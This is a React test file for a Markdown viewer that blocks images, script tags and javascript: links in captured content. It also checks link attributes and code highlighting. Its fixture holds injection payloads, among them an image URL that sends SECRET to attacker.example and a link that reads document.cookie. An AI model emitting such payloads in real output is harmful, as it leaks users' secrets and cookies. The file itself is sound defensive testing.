import React from "react";
import { render, screen } from "@testing-library/react";
import "@testing-library/jest-dom";
import CapturedMarkdown from "./CapturedMarkdown";
// After CapturedMarkdown, as in the app (FilterForm's editor).
import { highlight as prismHighlight, languages as prismLanguages } from "prismjs/components/prism-core";
import "prismjs/components/prism-clike";
import "prismjs/components/prism-javascript";

// jyx.82: captured content must not make the viewer's browser fetch
// anything, and must not carry script links.
describe("CapturedMarkdown", () => {
  const injected = [
    "Here you go ![chart](https://attacker.example/c?d=SECRET) done.",
    "",
    "[click me](javascript:alert(document.cookie)) and [docs](https://docs.example/a)",
    "",
    '<img src="https://attacker.example/raw.png"> <script>alert(1)</script>',
  ].join("\n");

  it("renders no <img> and no javascript: href", () => {
    const { container } = render(<CapturedMarkdown content={injected} />);
    // eslint-disable-next-line testing-library/no-node-access, testing-library/no-container
    expect(container.querySelectorAll("img")).toHaveLength(0);
    // eslint-disable-next-line testing-library/no-node-access, testing-library/no-container
    expect(container.querySelector("script")).toBeNull();
    for (const link of screen.queryAllByRole("link")) {
      expect(link.getAttribute("href") || "").not.toMatch(/^javascript:/i);
    }
  });

  it("shows a blocked image as a chip with its alt text and host", () => {
    render(<CapturedMarkdown content={injected} />);
    expect(screen.getByTestId("blocked-image")).toHaveTextContent("image: chart (attacker.example, not loaded)");
  });

  it("keeps links visible, with the target shown and safe rel", () => {
    render(<CapturedMarkdown content={injected} />);
    const docs = screen.getByRole("link", { name: "docs" });
    expect(docs).toHaveAttribute("href", "https://docs.example/a");
    expect(docs).toHaveAttribute("rel", "noopener noreferrer nofollow");
    expect(docs).toHaveAttribute("target", "_blank");
    expect(screen.getByText("(https://docs.example/a)")).toBeInTheDocument();
  });

  it("renders ordinary Markdown", () => {
    render(<CapturedMarkdown content={"**bold** and `code`"} />);
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getByText("code").tagName).toBe("CODE");
  });

  it("highlights fenced code under a language alias", () => {
    render(<CapturedMarkdown content={"```js\nconst a = 1;\n```"} />);
    // As JavaScript, the keyword is a token of its own.
    expect(screen.getByText("const")).toHaveStyle({ color: "rgb(220, 198, 224)" });
  });

  // #823 CI: the Prism builds of react-syntax-highlighter patch the shared
  // prismjs module (refractor), so FilterForm's editor got hast objects back
  // from Prism.highlight and crashed. CapturedMarkdown must leave it alone.
  it("leaves the shared prismjs highlight returning a string", () => {
    render(<CapturedMarkdown content={"```js\nconst a = 1;\n```"} />);
    expect(typeof prismHighlight("const a = 1;", prismLanguages.js, "js")).toBe("string");
  });
});
